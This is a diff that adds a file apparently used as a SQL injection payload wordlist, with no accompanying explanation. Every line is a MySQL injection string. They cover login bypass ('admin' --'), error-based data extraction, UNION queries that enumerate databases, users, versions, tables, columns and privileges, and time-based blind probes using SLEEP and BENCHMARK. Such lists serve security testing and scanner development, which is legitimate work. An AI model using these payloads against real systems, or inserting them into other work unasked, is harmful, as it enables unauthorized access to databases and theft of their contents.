@@ -1,0 +1,48 @@
+' OR '1'='1
+' OR 1=1 --
+' OR '1'='1' #
+' OR '1'='1' --
+admin' --
+admin' #
+' OR ''='
+" OR ""="
+'='
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) --
+" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) --
+' AND 1=CAST((SELECT @@version) AS SIGNED) --
+" AND 1=CAST((SELECT @@version) AS SIGNED) --
+' AND EXP(~(SELECT * FROM (SELECT USER())x)) --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT user(), database(), version() --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --
+' AND SLEEP(5) --
+" AND SLEEP(5) --
+' OR SLEEP(5) --
+" OR SLEEP(5) --
+' AND BENCHMARK(1000000, MD5(1)) --
+" AND BENCHMARK(1000000, MD5(1)) --
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' OR 1=2 --
+" AND 1=1 --
+" AND 1=2 --
+' UNION SELECT database(), NULL --
+" UNION SELECT database(), NULL --
+' UNION SELECT user(), NULL --
+" UNION SELECT user(), NULL --
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=DATABASE() --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+' AND @@version --
+" AND @@version --
+' UNION SELECT @@version, NULL --
+' AND IS_USED_LOCK('a') --
+' AND SELECT SLEEP(5) FROM DUAL WHERE IS_FREE_LOCK('a') --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+" AND (SELECT COUNT(*) FROM users) > 0 --
+' UNION SELECT version(), NULL --
+" UNION SELECT version(), NULL --
+' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges --
+" UNION SELECT grantee, privilege_type FROM information_schema.user_privileges --
